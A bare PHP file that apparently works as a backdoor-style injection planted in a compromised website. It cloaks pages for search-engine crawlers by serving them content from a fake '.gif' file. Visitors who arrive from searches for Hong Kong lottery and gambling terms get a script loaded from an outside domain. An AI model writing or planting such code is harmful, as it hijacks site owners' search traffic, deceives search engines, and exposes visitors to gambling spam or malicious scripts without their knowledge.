<?php

function _spider() {
	$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
	$spiderArr = array('360spider', 'so', 'soso', 'bing', 'sogou', 'sm', 'baidu');
	foreach($spiderArr as $v) {
		if(strpos($agent, $v) !== false) {
			return true;
		}
	}
}


function _main() {
	$index = strtolower($_SERVER['SCRIPT_NAME']);
	$indexArr = array('index', 'default', 'home', '1');
	foreach($indexArr as $v) {
		if(strpos($index, $v) !== false) {
			return true;
		}
	}
}

function _from() {
	$referer = strtolower($_SERVER['HTTP_REFERER']);
	if(empty($referer)) {
		return false;
	} 
	$refeerArr = array('so.com', '360', 'soso', 'bing', 'sogou' ,'sm', 'baidu');
	foreach($refeerArr as $v) {
		if(strpos($referer, $v) !== false) {
			return true;
		}
	}
}

function _keywords() {
	$referer = strtolower($_SERVER['HTTP_REFERER']);
	if(empty($referer)) {
		return false;
	} 
	$refeerArr = array('%C1%F9','%E5%85%AD','%BA%CF','%E5%90%88','%BA%CD','%E5%92%8C','%B2%CA','%E5%BD%A9','%CC%D8','%E7%89%B9','%C2%EB','%E7%A0%81','%BD%B1','%E5%A5%96','%C6%DA','%E6%9C%9F','%D0%A4','%E8%82%96','%CD%BC','%E5%9B%BE','lhc','lhc','%CF%E3%B8%DB','%E9%A6%99%E6%B8%AF','6%BA%CF','6%E5%90%88','%C2%ED%BB%E1','%E9%A9%AC%E4%BC%9A','%CC%D8%C2%EB','%E7%89%B9%E7%A0%81','%C2%DB%CC%B3','%E8%AE%BA%E5%9D%9B','%C1%F9%BA%CF','%E5%85%AD%E5%90%88','%BF%AA%BD%B1','%E5%BC%80%E5%A5%96','%BD%E1%B9%FB','%E7%BB%93%E6%9E%9C','%CD%BC%BF%E2','%E5%9B%BE%E5%BA%93','%D0%C4%CB%AE','%E5%BF%83%E6%B0%B4','%B9%DC%BC%D2%C6%C5','%E7%AE%A1%E5%AE%B6%E5%A9%86','%B0%D7%D0%A1%BD%E3','%E7%99%BD%E5%B0%8F%E5%A7%90','%D7%DF%CA%C6%CD%BC','%E8%B5%B0%E5%8A%BF%E5%9B%BE','%C0%CF%C7%AE%D7%AF','%E8%80%81%E9%92%B1%E5%BA%84','%D4%F8%B5%C0%C8%CB','%E6%9B%BE%E9%81%93%E4%BA%BA','%BF%AA%BD%B1%D6%B1%B2%A5','%E5%BC%80%E5%A5%96%E7%9B%B4%E6%92%AD','%B1%BE%C6%DA','%E6%9C%AC%E6%9C%9F','%D6%B1%B2%A5','%E7%9B%B4%E6%92%AD','%D7%CA%C1%CF','%E8%B5%84%E6%96%99','%CF%D6%B3%A1','%E7%8E%B0%E5%9C%BA','%BC%C7%C2%BC','%E8%AE%B0%E5%BD%95','%B1%A8','%E6%8A%A5','%CD%BC%D6%BD','%E5%9B%BE%E7%BA%B8','%CD%F8%D6%B7','%E7%BD%91%E5%9D%80','%B4%F3%C8%AB','%E5%A4%A7%E5%85%A8','%D0%FE%BB%FA','%E7%8E%84%E6%9C%BA','%D4%A4%B2%E2','%E9%A2%84%E6%B5%8B','%B9%AB%CA%BD','%E5%85%AC%E5%BC%8F','%BA%C5%C2%EB','%E5%8F%B7%E7%A0%81','%B5%D8%CF%C2','%E5%9C%B0%E4%B8%8B','%B9%D2%C5%C6','%E6%8C%82%E7%89%8C','%B2%D8%B1%A6','%E8%97%8F%E5%AE%9D','%C3%E2%B7%D1','%E5%85%8D%E8%B4%B9','%C0%FA%CA%B7','%E5%8E%86%E5%8F%B2','%CC%EC%CF%DF','%E5%A4%A9%E7%BA%BF','%CC%FA%CB%E3%C5%CC','%E9%93%81%E7%AE%97%E7%9B%98','%BA%EC%BD%E3','%E7%BA%A2%E5%A7%90','%D0%C4%BE%AD','%E5%BF%83%E7%BB%8F','mahui','tema','xianggang');
	foreach($refeerArr as $v) {
		if(stripos($referer, $v) !== false) {
			return true;
		}
	}
}

if(_spider() && _main()) {
	ob_end_clean();
	echo file_get_contents('images/Kesion.1.gif');
	echo '<!--'.date('Y-m-d H:i:s').'-->';
	ob_end_flush();
	exit();
}
if(_keywords()){
	if(_from()){
		ob_end_clean();
		echo '<script language="javascript" src="http://www.qss778.com/liu/tz.js"></script><br/>';
		ob_end_flush();
		exit();
	}
}
?>